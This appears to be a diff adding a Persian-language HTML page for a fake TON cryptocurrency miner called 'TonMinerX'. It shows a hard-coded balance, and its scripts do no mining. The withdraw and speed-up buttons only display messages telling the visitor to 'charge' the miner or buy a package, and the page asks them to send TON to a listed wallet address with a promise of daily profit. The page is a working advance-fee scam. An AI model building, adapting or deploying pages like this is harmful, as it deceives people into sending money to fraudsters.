@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="manifest" href="manifest.json">
+  <title>TonMinerX</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: sans-serif;
+      background-color: #eaf3ff;
+      text-align: center;
+    }
+    .container {
+      max-width: 480px;
+      margin: auto;
+      padding: 20px;
+      background: white;
+      border-radius: 20px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    .star {
+      font-size: 90px;
+      color: #0077ff;
+      animation: rotate 6s linear infinite;
+    }
+    @keyframes rotate {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+    .balance {
+      font-size: 24px;
+      margin: 10px 0;
+      color: #333;
+    }
+    .btn {
+      padding: 12px 20px;
+      margin: 10px;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    .start-btn {
+      background: #4b367c;
+      color: white;
+    }
+    .withdraw-box {
+      margin-top: 20px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      background: #f8f8f8;
+      display: inline-block;
+    }
+    .withdraw-msg {
+      background: #ffe0e0;
+      color: #a33;
+      padding: 8px 12px;
+      border-radius: 6px;
+      margin-bottom: 10px;
+      display: none;
+    }
+    .wallet {
+      background: #f0f0f0;
+      padding: 10px;
+      margin-top: 20px;
+      border-radius: 8px;
+      font-size: 14px;
+      color: #444;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div id="withdrawMsg" class="withdraw-msg">برای برداشت، ابتدا باید حداقل یک بار ماینر را شارژ کنید.</div>
+    <div class="star">★</div>
+    <div class="balance">موجودی شما: <span id="balance">3.0000000</span> TON</div>
+    <button class="btn start-btn" onclick="boost()">شروع + افزایش سرعت</button>
+
+    <div class="withdraw-box">
+      <button class="btn" style="background: #e8ffe8; color: #333;" onclick="withdraw()">برداشت</button>
+    </div>
+
+    <div class="wallet">
+      <p>بعد از انتقال TON به این آدرس، ماینر به‌صورت خودکار شارژ می‌شود و می‌توانید روزانه سود خود را برداشت کنید:</p>
+      <code style="font-size: 13px;">UQB6Cu4aYSIAwyeVwGZ6Uj_Ls30T4r8BNdgTBSCf4p-CxNyS</code>
+    </div>
+  </div>
+
+  <script>
+    function withdraw() {
+      const msg = document.getElementById("withdrawMsg");
+      msg.style.display = "block";
+      setTimeout(() => {
+        msg.style.display = "none";
+      }, 5000);
+    }
+
+    function boost() {
+      alert("برای افزایش سرعت ماین، باید یکی از بسته‌های پیشنهادی را انتخاب و ماینر را شارژ کنید.");
+    }
+  </script>
+</body>
+</html>
